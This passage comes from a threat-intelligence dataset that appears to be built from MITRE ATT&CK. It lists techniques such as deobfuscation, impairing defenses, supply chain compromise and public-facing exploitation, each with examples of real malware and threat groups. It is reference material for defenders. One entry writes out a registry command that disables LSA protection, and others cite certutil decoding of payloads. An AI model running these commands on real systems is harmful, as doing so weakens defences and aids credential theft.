exfiltration.', '[Patchwork] collected and exfiltrated files from the infected system.', '[ThreatNeedle] can collect data and files from a compromised host.', ""[APT3] will identify Microsoft Office documents on the victim's computer."", '[LightNeuron] can collect files from a local system.', '[RawPOS] dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.', '[DnsSystem] can upload files from infected machines after receiving a command with `uploaddd` in the string.', '[Forfiles] can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).', '[FatDuke] can copy files and directories from a compromised host.', '[Kevin] can upload logs and other data from a compromised host.', '[Wevtutil] can be used to export events from a specific log.', '[POWERSTATS] can upload files from compromised hosts.', '[SideTwist] has the ability to upload files from a compromised host.', '[Green Lambert] can collect data from a compromised host.', '[metaMain] can collect files and system information from a compromised host.', ""[Neoichor] can upload files from a victim's machine."", '[Zox] has the ability to upload files from a targeted system.', '[DarkWatchman] can collect files from a compromised host.', '[Gelsemium] can collect data from a compromised host.', '[Milan] can upload files from a compromised host.', 'During [Operation Honeybee] the threat actors collected data from compromised hosts.', '[LoFiSe] can collect files of interest from targeted systems.', ""[BADFLICK] has uploaded files from victims' machines."", '[CharmPower] can collect data and files from a compromised host.', '[Mis-Type] has collected files and data from a compromised host.', '[Out1] can copy files and Registry data from compromised hosts.', ""[Threat Group-3390] ran a command to compile an archive of file types of interest from the victim user's directories."", '[CreepyDrive] can upload files to C2 from victim machines.', '[GravityRAT] steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.', '[CookieMiner] has retrieved iPhone text messages from iTunes phone backup files.', '[QuietSieve] can collect files from a compromised host.', '[USBferry] can collect information from an air-gapped host machine.\t', 'During [Cutting Edge] threat actors stole the running configuration and cache data from targeted Ivanti Connect Secure VPNs.', '[TinyTurla] can upload files from a compromised host.', '[Machete] searches the File system for files of interest. ', 'During [Frankenstein] the threat actors used [Empire] to gather various local system information.', '[FIN7] has collected files and other sensitive information from a compromised network.', '[Pillowmint] has collected credit card data using native API functions.', '[Goopy] has the ability to exfiltrate documents from infected systems.\t', '[PoisonIvy] creates a backdoor through which remote attackers can steal system information.', '[MCMD] has the ability to upload files from an infected device.', 'During [CostaRicto] the threat actors collected data and files from compromised networks.', '[RCSession] can collect data from a compromised host.', ""[FunnyDream] can upload files from victims' machines."", '[Ixeshe] can collect data from a local system.', '[OSX_OCEANLOTUS.D] has the ability to upload files from a compromised host.', '[Crutch] can exfiltrate files from compromised systems.', '[Koadic] can download files off the target system to send back to the server.', '[Stealth Falcon] malware gathers data from the local victim system.', '[ROKRAT] can collect host data and specific file types.', '[APT38] has collected data from a compromised host.', '[FlawedAmmyy] has collected information and files from a compromised machine.', '[Volt Typhoon] has stolen the Active Directory database from targeted environments and used [Wevtutil] to extract event log information.', '[Linfo] creates a backdoor through which remote attackers can obtain data from local systems.', '[ShimRat] has the capability to upload collected files to a C2.\t', '[PinchDuke] collects user files from the compromised host based on predefined file extensions.', '[Chrommme] can collect data from a local system.', '[CosmicDuke] steals user files from local hard drives with file extensions that match a predefined list.', '[BadPatch] collects files from the local system that have the following extensions, then prepares them for exfiltration: .xls, .xlsx, .pdf, .mdb, .rar, .zip, .doc, .docx.', '[esentutl] can be used to collect data from local file systems.', '[Hikit] can upload files from compromised machines.', '[ZxxZ] can collect data from a compromised host.', '[menuPass] has collected various files from the compromised computers. ', '[Wizard Spider] has collected data from a compromised host prior to exfiltration.', '[Kazuar] uploads files from a specified directory to the C2 server.', '[Pasam] creates a backdoor through which remote attackers can retrieve files.', '[KGH_SPY] can send a file containing victim system information to C2.', '[Magic Hound] has used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine.', '[TajMahal] has the ability to steal documents from the local system including the print spooler queue.', 'During [Operation CuckooBees] the threat actors collected data, files, and other information from compromised networks.', ""[Dark Caracal] collected complete contents of the 'Pictures' folder from compromised Windows systems."", '[STARWHALE] can collect data from an infected local host.', '[KOPILUWAK] can gather information from compromised hosts.', '[Clambling] can collect information from a compromised host.', '[WellMail] can exfiltrate files from the victim machine.', '[RainyDay] can use a file exfiltration tool to collect recently changed files on a compromised host.', '[StrifeWater] can collect data from a compromised host.', '[Bandook] can collect local files from the system . ', '[Sandworm Team] has exfiltrated internal documents, files, and other data from compromised hosts.', '[Action RAT] can collect local data from an infected machine.', '[Pcexter] can upload files from targeted systems.', '[FIN13] has gathered stolen credentials, sensitive data such as point-of-sale (POS), and ATM data from a compromised network before exfiltration.', '[njRAT] can collect data from a local system.', '[Samurai] can leverage an exfiltration module to download arbitrary files from compromised machines.', '[Saint Bot] can collect files and information from a compromised host.', 'During [C0026] the threat actors collected documents from compromised hosts.', '[APT29] has extracted files from compromised networks. ', '[UNC2452] extracted files from compromised networks. ', '[Frankenstein] has enumerated hosts via [Empire] gathering various local system information.', '[Operation Wocao] has exfiltrated files and directories of interest from the targeted system.', '[Dust Storm] has used Android backdoors capable of exfiltrating specific files directly from the infected devices.', '[Honeybee] collects data from the local victim system.', '[Dragonfly 2.0] collected data from local victim systems.', '[Cobalt Strike] can collect data from a local system.', 'creates a backdoor through which remote attackers can steal system information.']",False
T1140,Deobfuscate/Decode Files or Information,Adversaries may use [Obfuscated Files or Information] to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.  One such example is the use of [certutil] to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.  Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution] The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. ,"['[ZeroT] shellcode decrypts and decompresses its RC4-encrypted payload.', '[AppleJeus] has decoded files received from a C2.', '[Action RAT] can use Base64 to decode actor-controlled C2 server communications.', '[BRONZE BUTLER] downloads encoded payloads and decodes them on the victim.', '[KOCTOPUS] has deobfuscated itself before executing its commands.', '[Snip3] can decode its second-stage PowerShell script prior to execution.', '[BendyBear] has decrypted function blocks using a XOR key during runtime to evade detection.', '[LiteDuke] has the ability to decrypt and decode multiple layers of obfuscation.', '[P.A.S. Webshell] can use a decryption mechanism to process a user supplied password and allow execution.', '[KONNI] has used certutil to download and decode base64 encoded strings and has also devoted a custom section to performing all the components of the deobfuscation process.', '[Turla] has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or [PowerShell Profile] to decode encrypted PowerShell payloads.', '[Machete] downloaded data is decrypted using AES.', '[BOOSTWRITE] has used a a 32-byte long multi-XOR key to decode data inside its payload.\t', '[APT39] has used malware to decrypt encrypted CAB files.', '[RotaJakiro] uses the AES algorithm, bit shifts in a function called `rotate`, and an XOR cipher to decrypt resources required for persistence, process guarding, and file locking. It also performs this same function on encrypted stack strings and the `head` and `key` sections in the network packet structure used for C2 communications.', '[More_eggs] will decode malware components that are then dropped to the system.', '[DarkTortilla] can decrypt its payload and associated configuration elements using the Rijndael cipher.', '[Gelsemium] can decompress and decrypt DLLs and shellcode.', '[Smoke Loader] deobfuscates its code.', '[Mispadu] decrypts its encrypted configuration files prior to execution.', '[Clop] has used a simple XOR operation to decrypt strings.', '[SDBbot] has the ability to decrypt and decompress its payload to enable code execution.', '[Babuk] has the ability to unpack itself into memory using XOR.', '[BBSRAT] uses [Expand] to decompress a CAB file into executable content.', '[SysUpdate] can deobfuscate packed binaries in memory.', '[Lokibot] has decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload, and has decoded its server response hex string using XOR.', '[POWERSTATS] can deobfuscate the main backdoor code.', '[QUADAGENT] uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.', '[WIRTE] has used Base64 to decode malicious VBS script.', '[VaporRage] can deobfuscate XOR-encoded shellcode prior to execution.', '[Gorgon Group] malware can decode contents from a payload that was Base64 encoded and write the contents to a file.', '[Kimsuky] has decoded malicious VBScripts using Base64.', '[Lucifer] can decrypt its C2 address upon execution.', '[Avaddon] has decrypted encrypted strings.', '[SombRAT] can run <code>upload</code> to decrypt and upload files from storage.', '[Mongall] has the ability to decrypt its payload prior to execution.', '[WIREFIRE] can decode, decrypt, and decompress data received in C2 HTTP `POST` requests.', '[FoggyWeb] can be decrypted in memory using a Lightweight Encryption Algorithm (LEA)-128 key and decoded using a XOR key.', '[Imminent Monitor] has decoded malware components that are then dropped to the system.', 'For [Operation Spalax] the threat actors used a variety of packers and droppers to decrypt malicious payloads.', '[RAPIDPULSE] listens for specific HTTP query parameters in received communications. If specific parameters match, a hard-coded RC4 key is used to decrypt the HTTP query paremter <code>hmacTime</code>. This decrypts to a filename that is then open, read, encrypted with the same RC4 key, base64-encoded, written to standard out, then passed as a response to the HTTP request.', '[Aria-body] has the ability to decrypt the loader configuration and payload DLL.', '[ShadowPad] has decrypted a binary blob to start execution.', '[QUIETCANARY] can use a custom parsing routine to decode the command codes and additional parameters from the C2 before executing them.', '[Starloader] decrypts and executes shellcode from a file called Stars.jps.', '[TSCookie] has the ability to decrypt, load, and execute a DLL and its resources.', '[Conti] has decrypted its payload using a hardcoded AES-256 key.', '[Kwampirs] decrypts and extracts a copy of its main DLL payload when executing.', '[RainyDay] can decrypt its payload via a XOR key.', '[DDKONG] decodes an embedded configuration using XOR.', '[Expand] can be used to decompress a local or remote CAB file into an executable.', '[Denis] will decrypt important strings used for C&C communication.', '[Bumblebee] can deobfuscate C2 server responses and unpack its code on targeted hosts.', '[Final1stspy] uses Python code to deobfuscate base64-encoded strings.', '[Ke3chang] has deobfuscated Base64-encoded shellcode strings prior to loading them.', '[BoomBox] can decrypt AES-encrypted files downloaded from C2.', 'The [Chinoxy] dropping function can initiate decryption of its config file.', '[Azorult] uses an XOR key to decrypt content and uses Base64 to decode the C2 address.', '[Astaroth] uses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code. ', '[QakBot] can deobfuscate and re-assemble code strings for execution.', '[Stuxnet] decrypts resources that are loaded into memory and executed.', '[Netwalker] PowerShell script can decode and decrypt multiple layers of obfuscation, leading to the [Netwalker] DLL being loaded into memory.', '[Squirrelwaffle] has decrypted files and payloads using a XOR-based algorithm.', '[AppleSeed] can decode its payload prior to execution.', '[ABK] has the ability to decrypt AES encrypted payloads.', '[OopsIE] concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.', '[KEYPLUG] can decode its configuration file to determine C2 protocols.', '[LIGHTWIRE] can RC4 decrypt and Base64 decode C2 commands.', '[Winnti for Linux] has decoded XOR encoded strings holding its configuration upon execution.', '[CharmPower] can decrypt downloaded modules prior to execution.', '[Ebury] has verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key.', '[Mafalda] can decrypt files and data.', '[Molerats] decompresses ZIP files once on the victim machine.', '[Bisonal] has decoded strings in the malware using XOR and RC4. ', 'During [C0017] [APT41] used the DUSTPAN loader to decrypt embedded payloads.', '[Darkhotel] has decrypted strings and imports using RC4 during execution.', '[OSX_OCEANLOTUS.D] uses a decode routine combining bit shifting and XOR operations with a variable key that depends on the length of the string that was encoded. If the computation for the variable XOR key turns out to be 0, the default XOR key of 0x1B is used. This routine is also referenced as the `rotate` function in reporting.', '[PyDCrypt] has decrypted and dropped the [DCSrv] payload to disk.', '[Rising Sun] has decrypted itself using a single-byte XOR scheme. Additionally, [Rising Sun] can decrypt its configuration data at runtime.\t', '[Crimson] can decode its encoded PE file prior to execution.', '[Torisma] has used XOR and Base64 to decode C2 data.', '[Heyoka Backdoor] can decrypt its payload prior to execution.', '[Earth Lusca] has used [certutil] to decode a string into a cabinet file.', '[Chrommme] can decrypt its encrypted internal code.', '[Bankshot] decodes embedded XOR strings.', ""[VERMIN] decrypts code, strings, and commands to use once it's on the victim's machine."", '[LightNeuron] has used AES and XOR to decrypt configuration files and commands.', ""[Kessel] has decrypted the binary's configuration once the <code>main</code> function was launched."", '[GLASSTOKEN] has the ability to decode hexadecimal and Base64 C2 requests.', '[ISMInjector] uses the <code>certutil</code> command to decode a payload file.', '[Sardonic] can first decrypt with the RC4 algorithm using a hardcoded decryption key before decompressing.', '[ZIRCONIUM] has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code.', '[MuddyWater] has decoded base64-encoded PowerShell, JavaScript, and VBScript.', '[certutil] has been used to decode binaries hidden inside certificate files as Base64 information.', '[metaMain] can decrypt and load other modules.', '[Taidoor] can use a stream cipher to decrypt stings used by the malware.', '[SLIGHTPULSE] can deobfuscate base64 encoded and RC4 encrypted C2 messages.', '[RDAT] can deobfuscate the base64-encoded and AES-encrypted files downloaded from the C2 server.\t', '[Egregor] has been decrypted before execution. ', 'A [OilRig] macro has run a PowerShell command to decode file contents. [OilRig] has also used [certutil] to decode base64-encoded files on victims.', '[EnvyScout] can deobfuscate and write malicious ISO files to disk.', '[Bundlore] has used <code>openssl</code> to decrypt AES encrypted payload data. [Bundlore] has also used base64 and RC4 with a hardcoded key to deobfuscate data.', '[HyperBro] can unpack and decrypt its payload prior to execution.', '[Dyre] decrypts resources needed for targeting the victim.', '[Waterbear] has the ability to decrypt its RC4 encrypted payload for execution.', '[Ursnif] has used crypto key information stored in the Registry to decrypt Tor clients dropped to disk.', '[Exaramel for Linux] can decrypt its configuration file.', '[Avenger] has the ability to decrypt files downloaded from C2.', 'During the [SolarWinds Compromise] [APT29] used 7-Zip to decode their [Raindrop] malware.', '[AvosLocker] has deobfuscated XOR-encoded strings.', '[YAHOYAH] decrypts downloaded files before execution.', '[IceApple] can use a Base64-encoded AES key to decrypt tasking.', '[BBK] has the ability to decrypt AES encrypted payloads.', 'One [TYPEFRAME] variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value ""0x35"".', 'The [Ninja] loader component can decrypt and decompress the payload.', '[Pteranodon] can decrypt encrypted data strings prior to using them.', '[Mori] can resolve networking APIs from strings that are ADD-encrypted.', '[Emotet] has used a self-extracting RAR file to deliver modules to victims. Emotet has also extracted embedded executables from files using hard-coded buffer offsets.', '[WarzoneRAT] can use XOR 0x45 to decrypt obfuscated code.', '[Brute Ratel C4] has the ability to deobfuscate its payload prior to execution.', '[Green Lambert] can use multiple custom routines to decrypt strings prior to execution.', '[Proton] uses an encrypted file to store commands and configuration values.', '[Kobalos] decrypts strings right after the initial communication, but before the authentication process. ', '[BabyShark] has the ability to decode downloaded files prior to execution.', '[Carbon] decrypts task and configuration files for execution.', '[HermeticWiper] can decompress and copy driver files using `LZCopy`.', '[Remexi] decrypts the configuration data using XOR with 25-character keys.', '[gh0st RAT] has decrypted and loaded the [gh0st RAT] DLL into memory, once the initial dropper executable is launched.', '[Gamaredon Group] tools decrypted additional payloads from the C2. [Gamaredon Group] has also decoded base64-encoded source code of a downloader.', '[Woody RAT] can deobfuscate Base64-encoded strings and scripts.', '[OSX/Shlayer] can base64-decode and AES-decrypt downloaded payloads. Versions of [OSX/Shlayer] pass encrypted and password-protected code to <code>openssl</code> and then write the payload to the <code>/tmp</code> folder.', '[PcShare] has decrypted its strings by applying a XOR operation and a decompression using a custom implemented LZM algorithm.', '[TA505] has decrypted packed DLLs with an XOR key.', ""[CookieMiner] has used Google Chrome's decryption and extraction operations."", '[DropBook] can unarchive data downloaded from the C2 to obtain the payload and persistence modules. ', '[RegDuke] can decrypt strings with a key either stored in the Registry or hardcoded in the code.', '[Shamoon] decrypts ciphertext using an XOR cipher and a base64-encoded string.\t', 'During execution, [Threat Group-3390] malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.', 'An [APT28] macro uses the command <code>certutil -decode</code> to decode contents of a .txt file storing the base64 encoded payload.', '[HUI Loader] can decrypt and load files containing malicious payloads.', '[Skidmap] has the ability to download, unpack, and decrypt tar.gz files . ', ""[ROKRAT] can decrypt strings using the victim's hostname as the key."", '[Siloscape] has decrypted the password of the C2 server with a simple byte by byte XOR. [Siloscape] also writes both an archive of [Tor] and the <code>unzip</code> binary to disk from data embedded within the payload using Visual Studio’s Resource Manager.', 'After checking for the existence of two files, keyword_parm.txt and parm.txt, [MESSAGETAP] XOR decodes and read the contents of the files. ', '[ShimRat] has decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system.', '[Drovorub] has de-obsfuscated XOR encrypted payloads in WebSocket messages.', '[GoldMax] has decoded and decrypted the configuration file when executed.', '[MegaCortex] has used a Base64 key to decode its components.', '[TeamTNT] has used a script that decodes a Base64-encoded version of WeaveWorks Scope.', '[Lizar] can decrypt its configuration data.', '[Turian] has the ability to use a XOR decryption key to extract C2 server domains and IP addresses.', '[SideTwist] can decode and decrypt messages received from C2.', '[REvil] can decode encrypted strings to enable execution of commands and payloads.', '[Agent Tesla] has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.', '[MacMa] decrypts a downloaded file using AES-128-EBC with a custom delta.', '[DEADEYE] has the ability to combine multiple sections of a binary which were broken up to evade detection into a single .dll prior to execution.', '[WellMail] can decompress scripts received from C2.', ""During [C0021] the threat actors deobfuscated encoded PowerShell commands including use of the specific string `'FromBase'+0x40+'String'`, in place of `FromBase64String` which is normally used to decode base64."", '[CoinTicker] decodes the initially-downloaded hidden encoded file using OpenSSL.', '[DarkWatchman] has the ability to self-extract as a RAR archive.', '[SharpStage] has decompressed data received from the C2 server.', '[menuPass] has used [certutil] in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used <code>certutil -decode</code> to decode files on the victim’s machine when dropping [UPPERCUT]', '[DarkGate] installation includes binary code stored in a file located in a hidden directory, such as <code>shell.txt</code>, that is decrypted then executed. [DarkGate] uses hexadecimal-encoded shellcode payloads during installation that are called via Windows API <code>CallWindowProc()</code> to decode and then execute.', '[Sibot] can decrypt data received from a C2 and save to a file.', '[NativeZone] can decrypt and decode embedded  [Cobalt Strike] beacon stage shellcode.', '[Pillowmint] has been decompressed by included shellcode prior to being launched.\t', '[Lazarus Group] has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime.', '[Hildegard] has decrypted ELF files with AES.', '[ComRAT] has used unique per machine passwords to decrypt the orchestrator payload and a hardcoded XOR key to decrypt its communications module. [ComRAT] has also used a unique password to decrypt the file used for its hidden file system.', '[Grandoreiro] can decrypt its encrypted internal strings.', '[Clambling] can deobfuscate its payload prior to execution.', '[TrickBot] decodes the configuration data and modules.', '[FIVEHANDS] has the ability to decrypt its payload prior to execution.', '[Saint Bot] can deobfuscate strings and files for execution.', '[Cobalt Strike] can deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions.', '[Shark] can extract and decrypt downloaded .zip files.', '[IronNetInjector] has the ability to decrypt embedded .NET and PE payloads.', '[Spark] has used a custom XOR algorithm to decrypt the payload. ', '[Okrum] loader can decrypt the backdoor code, embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption.', '[WindTail] has the ability to decrypt strings using hard-coded AES keys.', '[InvisiMole] can decrypt, unpack and load a DLL from its resources, or from blobs encrypted with Data Protection API, two-key triple DES, and variations of the XOR cipher.', '[HiddenWasp] uses a cipher to implement a decoding function.', '[ThreatNeedle] can decrypt its payload using RC4, AES, or one-byte XORing.', '[SQLRat] has scripts that are responsible for deobfuscating additional scripts.', '[SUNSPOT] decrypts [SUNBURST] which was stored in AES128-CBC encrypted blobs.  ', '[Valak] has the ability to decode and decrypt downloaded files.', '[Leviathan] has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.', '[TEARDROP] was decoded using a custom rolling XOR algorithm to execute a customized [Cobalt Strike] payload.', '[PUNCHBUGGY] has used [PowerShell] to decode base64-encoded assembly.', '[NOKKI] uses a unique, custom de-obfuscation technique.', '[Cinnamon Tempest] has used weaponized DLLs to load and decrypt payloads.', '[PS1] can use an XOR key to decrypt a PowerShell loader and payload binary.', '[Cardinal RAT] decodes many of its artifacts and is decrypted (AES-128) after being downloaded.', '[WhisperGate] can deobfuscate downloaded files stored in reverse byte order and decrypt embedded resources using multiple XOR operations.', '[Rocke] has extracted tar.gz files after downloading them from a C2 server.', '[GrimAgent] can use a decryption algorithm for strings based on Rotate on Right (RoR) and Rotate on Left (RoL) functionality.', '[PowGoop] can decrypt PowerShell scripts for execution.', '[WellMess] can decode and decrypt data received from C2.', '[FYAnti] has the ability to decrypt an embedded .NET module.', '[Goopy] has used a polymorphic decryptor to decrypt itself at runtime.', '[WastedLocker] custom cryptor, CryptOne, used an XOR based algorithm to decrypt the payload.', '[PlugX] decompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer.', '[COATHANGER] decodes configuration items from a bundled file for command and control activity.', '[Kerrdown] can decode, decrypt, and decompress multiple layers of shellcode.', '[DanBot] can use a VBA macro to decode its payload prior to installation and execution.', '[PingPull] can decrypt received data from its C2 server by using AES.', '[BADFLICK] can decode shellcode using a custom rotating XOR cipher.', '[Uroburos] can decrypt command parameters sent through C2 and use unpacking code to extract its packed executable.', '[PipeMon] can decrypt password-protected executables.', '[RGDoor] decodes Base64 strings and decrypts strings using a custom XOR algorithm.', '[FinFisher] extracts and decrypts stage 3 malware, which is stored in encrypted resources.', '[Tropic Trooper] used shellcode with an XOR algorithm to decrypt a payload. [Tropic Trooper] also decrypted image files which contained a payload.', '[FIN13] has utilized `certutil` to decode base64 encoded versions of custom malware.', '[Amadey] has decoded antivirus name strings.', '[STEADYPULSE] can URL decode key/value pairs sent over C2.', 'During [Frankenstein] the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.', '[AuditCred] uses XOR and RC4 to perform decryption on the code functions.', 'The [Winnti for Windows] dropper can decrypt and decompresses a data blob.', '[Bazar] can decrypt downloaded payloads. [Bazar] also resolves strings and other artifacts at runtime.', '[PoetRAT] has used LZMA and base64 libraries to decode obfuscated scripts.', '[Sandworm Team] VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.', '[PowerLess] can use base64 and AES ECB decryption prior to execution of downloaded modules.', '[OnionDuke] can use a custom decryption algorithm to decrypt strings.', 'During [Operation Dust Storm] attackers used VBS code to decode payloads.', '[Zebrocy] decodes its secondary payload and writes it to the victim’s machine. [Zebrocy] also uses AES and XOR to decrypt strings and payloads.', '[Malteiro] has the ability to deobfuscate downloaded files prior to execution.', '[Zeus Panda] decrypts strings in the code during the execution process.', '[PITSTOP] can deobfuscate base64 encoded and AES encrypted commands.', '[BackConfig] has used a custom routine to decrypt strings.', '[Cyclops Blink] can decrypt and parse instructions sent from C2.', '[BLINDINGCAN] has used AES and XOR to decrypt its DLLs.', '[FRAMESTING] can decompress data received within `POST` requests.', '[Chaes] has decrypted an AES encrypted binary file to trigger the download of other files. ', '[Bandook] has decoded its PowerShell script.', '[SoreFang] can decode and decrypt exfiltrated data sent to C2.', '[Ramsay] can extract its agent from the body of a malicious document.\t', '[MirageFox] has a function for decrypting data containing C2 configuration information.', '[xCaon] has decoded strings from the C2 server before executing commands. ', 'Upon execution, [Metamorfo] has unzipped itself after being downloaded to the system and has performed string decryption. ', '[BUSHWALK] can Base64 decode and RC4 decrypt malicious payloads sent through a web request’s command parameter.', '[KGH_SPY] can decrypt encrypted strings and write them to a newly created folder.', '[CostaBricks] has the ability to use bytecode to decrypt embedded payloads.', '[RogueRobin] decodes an embedded executable using base64 and decompresses it.', '[Industroyer] decrypts code to connect to a remote C2 server.', '[ZxxZ] has used a XOR key to decrypt strings.', 'During [Operation Honeybee] malicious files were decoded prior to execution.', 'An [APT19] HTTP malware variant decrypts strings using single-byte XOR keys.', '[Ecipekac] has the ability to decrypt fileless loader modules.', '[Higaisa] used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.', '[FatDuke] can decrypt AES encrypted C2 communications.', '[Volgmer] deobfuscates its strings and APIs once its executed.', '[LookBack] has a function that decrypts malicious data.', '[PolyglotDuke] can use a custom algorithm to decrypt strings used by the malware.', '[Raindrop] decrypted its [Cobalt Strike] payload using an AES-256 encryption algorithm in CBC mode with a unique key per sample.', '[Dtrack] has used a decryption routine that is part of an executable physical patch.', '[Hancitor] has decoded Base64 encoded URLs to insert a recipient’s name into the filename of the Word document. [Hancitor] has also extracted executables from ZIP files.', '[UNC2452] used 7-Zip to decode its [Raindrop] malware.', '[APT29] used 7-Zip to decode its [Raindrop] malware.', '[Frankenstein] has deobfuscated base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.  ', '[Honeybee] drops a Word file containing a Base64-encoded file in it that is read, decoded, and dropped to the disk by the macro.', 'APT34 has used certutil to decode base64-encoded files on victims.']",False
T1562,Impair Defenses,"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.  Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.  Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.","['[Stuxnet] reduces the integrity level of objects to allow write actions.', '[Magic Hound] has disabled LSA protection on compromised hosts using `""reg"" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f`.']",False
T1195,Supply Chain Compromise,"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.  Supply chain compromise can take place at any stage of the supply chain including:  * Manipulation of development tools * Manipulation of a development environment * Manipulation of source code repositories (public or private) * Manipulation of source code in open-source dependencies * Manipulation of software update/distribution mechanisms * Compromised/infected system images (multiple cases of removable media infected at the factory)  * Replacement of legitimate software with modified versions * Sales of modified/counterfeit products to legitimate distributors * Shipment interdiction  While supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.","['[Elderwood] has targeted manufacturers in the supply chain for the defense industry.', '[Smoke Loader] was distributed through a compromised update to a Tor client with a coin miner payload.', '[NotPetya] initial infection vector for the June 27, 2017 compromise was a backdoor in the Ukrainian tax accounting software M.E.Doc.']",False
T1190,Exploit Public-Facing Application,"Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.  Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion] or [Exploitation for Client Execution]  If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host] or take advantage of weak identity and access management policies.  Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.  For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.","['During [C0027] [Scattered Spider] exploited CVE-2021-35464 in the ForgeRock Open Access Management (OpenAM) application server to gain initial access.', '[Rocke] exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.', '[Threat Group-3390] has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.', '[FIN7] has compromised targeted organizations through exploitation of CVE-2021-31207 in Exchange.', 'During [C0018] the threat actors exploited VMWare Horizon Unified Access Gateways that were vulnerable to several Log4Shell vulnerabilities, including CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, and CVE-2021-44832.', '[Siloscape] is executed after the attacker gains initial access to a Windows container using a known vulnerability. ', '[Volt Typhoon] gained initial access through exploitation of CVE-2021-40539 in internet-facing ManageEngine ADSelfService Plus servers.', '[Sandworm Team] exploits public-facing applications for initial access and to acquire infrastructure, such as exploitation of the EXIM mail transfer agent in Linux systems.', '[APT28] has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.', '[Kimsuky] has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688.', 'During [Operation Wocao] threat actors gained initial access by exploiting vulnerabilities in JBoss webservers.', 'During [Night Dragon] threat actors used SQL injection exploits against extranet web servers to gain access.', ' During [C0017] [APT41] exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access.', '[BackdoorDiplomacy] has exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor. [BackdoorDiplomacy] has also exploited mis-configured Plesk servers.', '[GOLD SOUTHFIELD] has exploited Oracle WebLogic vulnerabilities for initial compromise.', '[FIN13] has exploited known vulnerabilities such as CVE-2017-1000486 (Primefaces Application Expression Language Injection), CVE-2015-7450 (WebSphere Application Server SOAP Deserialization Exploit), CVE-2010-5326 (SAP NewWeaver Invoker Servlet Exploit), and EDB-ID-24963 (SAP NetWeaver ConfigServlet Remote Code Execution) to gain initial access.', '[BlackTech] has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server.', '[sqlmap] can be used to automate exploitation of SQL injection vulnerabilities.', '[Magic Hound] has exploited the Log4j utility (CVE-2021-44228), on-premises MS Exchange servers via ""ProxyShell"" (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207), and Fortios SSL VPNs 